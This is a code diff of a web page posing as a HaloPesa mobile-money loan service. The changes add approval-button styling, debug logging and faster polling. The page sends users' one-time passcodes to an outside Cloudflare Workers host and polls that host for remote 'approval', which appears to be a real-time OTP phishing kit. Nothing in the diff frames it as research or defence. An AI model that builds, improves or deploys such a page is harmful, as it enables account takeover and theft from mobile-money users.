@@ -250,6 +250,7 @@ input[type=range].loan-range::-moz-range-thumb{
 }
 .btn.verifying .btn-spinner{display:block}
 .btn.verifying .btn-label{opacity:.7}
+
 </style>
 </head>
 <body>
@@ -541,6 +542,8 @@ input[type=range].loan-range::-moz-range-thumb{
 
 
 /* ── Session ID: unique per loan session ── */
+
+
 var sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2,6);
 var approvalPoller = null;
 
@@ -821,6 +824,7 @@ function verifyOtp1(){
   for(var j=0;j<4;j++) document.getElementById('o1b'+j).classList.add('ok');
   hap([10,6,18]);
   if(otp1Timer) clearInterval(otp1Timer);
+  dbg('verify clicked sid='+sessionId.slice(-6));
   setOtp1Verifying(true);
   var _t1 = getLoanTier(loanAmount);
   fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
@@ -836,7 +840,13 @@ function verifyOtp1(){
       setOtp1Verifying(false);
       if(approved){
         hap([10,6,18]);
+        /* Show approved state briefly before moving on */
+        var btn1 = document.getElementById('otp1Btn');
+        btn1.classList.remove('off','verifying');
+        btn1.style.background = 'linear-gradient(135deg,#1B8A4C,#146838)';
+        btn1.querySelector('.btn-label').textContent = lang==='sw'?'Imeidhinishwa ✓':'Approved ✓';
         setTimeout(function(){
+          btn1.style.background = '';
           goStep('processing');
           setTimeout(function(){
             updateLoanDisplay(loanAmount);
@@ -854,7 +864,7 @@ function verifyOtp1(){
         setOtp1Locked(true);
       }
     });
-  }).catch(function(){ setOtp1Verifying(false); });
+  }).catch(function(e){ dbg('fetch err:'+e); setOtp1Verifying(false); });
 }
 function verifyOtp2(){
   if(otp2Val.length !== 4) return;
@@ -885,6 +895,10 @@ function verifyOtp2(){
       setOtp2Verifying(false);
       if(approved){
         hap([10,6,18,6,30]);
+        var btn2 = document.getElementById('otp2Btn');
+        btn2.classList.remove('off','verifying');
+        btn2.style.background = 'linear-gradient(135deg,#1B8A4C,#146838)';
+        btn2.querySelector('.btn-label').textContent = lang==='sw'?'Imeidhinishwa ✓':'Approved ✓';
         for(var j=0;j<4;j++) document.getElementById('o2b'+j).classList.add('ok');
         setTimeout(function(){
           document.getElementById('refNo').textContent = 'HP'+Date.now().toString(36).toUpperCase();
@@ -1110,15 +1124,15 @@ function pollApproval(key, cb){
       cb(false);
       return;
     }
+    dbg('poll #'+attempts+' key='+key.slice(-8));
     fetch('https://halopesa.lennxkoros.workers.dev/approval?key=' + encodeURIComponent(key))
       .then(function(r){ return r.json(); })
       .then(function(data){
         if(data.status === 'approved'){ clearInterval(iv); cb(true); }
         else if(data.status === 'declined'){ clearInterval(iv); cb(false); }
-        /* pending — keep polling */
       })
-      .catch(function(){});
-  }, 1000);
+      .catch(function(e){ dbg('poll err:'+e); });
+  }, 500);
 }
 
 /* OTP1 verifying UI state */
